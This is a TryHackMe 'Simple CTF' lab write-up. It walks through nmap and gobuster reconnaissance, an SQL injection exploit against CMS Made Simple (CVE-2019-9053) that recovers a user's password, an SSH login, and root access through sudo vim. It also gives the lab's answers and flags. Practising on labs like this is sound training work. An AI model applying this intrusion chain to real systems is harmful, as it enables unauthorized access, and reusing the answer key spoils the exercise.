# Try Hack Me - Simple CTF

setup variable IP for easy use
```bash
export IP=10.10.125.14
```

# TASK 1

Q. How many services are running under port 1000?
A. 2

```bash
nmap -sC -sV -oN nmap/initial
```
```
Nmap 7.95 scan initiated Thu Jun 19 19:04:09 2025 as: /usr/lib/nmap/nmap --privileged -sC -sV -oN nmap/initial 10.10.158.149
Nmap scan report for 10.10.158.149
Host is up (0.14s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.6.57.243
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-robots.txt: 2 disallowed entries 
|_/ /openemr-5_0_1_3 
|_http-title: Apache2 Ubuntu Default Page: It works
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a:cd:a9:23 (RSA)
|   256 9b:d1:65:07:51:08:00:61:98:de:95:ed:3a:e3:81:1c (ECDSA)
|_  256 12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6 (ED25519)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
```

Q. What is running on the higher port?
A. ssh

Q. What's the CVE you're using against the application? 
A. CVE-2019-9053

now let's hunt for hidden directories
```bash
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://10.10.158.149
```

/simple/
CMS Simple Made Simple site running 2.2.8

quick google gets us the CVE


Q. To what kind of vulnerability is the application vulnerable?
A. SQL Injection. i.e SQLi


Q. What's the password?
A. secret

First lets grab the exploit code. Nist provides two sites. I prefer exploit-db - https://www.exploit-db.com/exploits/46635

```
Ran this with Python3 and I kept getting an argument error. After looking at the code I see that it was using some really old libraries and syntax.
Time for a quick rewrite! I have posted the new version in the root of write-ups. It now works with Pyhton3 (out of the box) on Kali as of 6/18/2025
```

Running the updated code provides
```
Salt :1dac0d92e9fa6bb2
Username: mitch
email: admin@admin.com
password hash: 0c01f4468bd75d7a84c7eb73846e8d96
password: secret
```
Q. Where can you login with the details obtained?
A. http://10.10.222.217/simple/admin/login.php

```bash
gobuster dir -u http://10.10.222.217/simple/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php,php3,html
```
SPent hours trying to upload reverse shells. Only to remember we have ssh on port 2222. Luets try the user name and password

```bash
ssh mitch@10.10.222.217 -p 2222
```
bingo!


Q. What's the user flag?
A. G00d j0b, keep up!

It's in mitchs home directory!

Q. Is there any other user in the home directory? What's its name?
A. sunbath

```bash
cd ..
ls -la
```


Q. What can you leverage to spawn a privileged shell?
A. vim

```bash
sudo -l
```

Q. What's the root flag?
A. sudo vim /root/root.txt
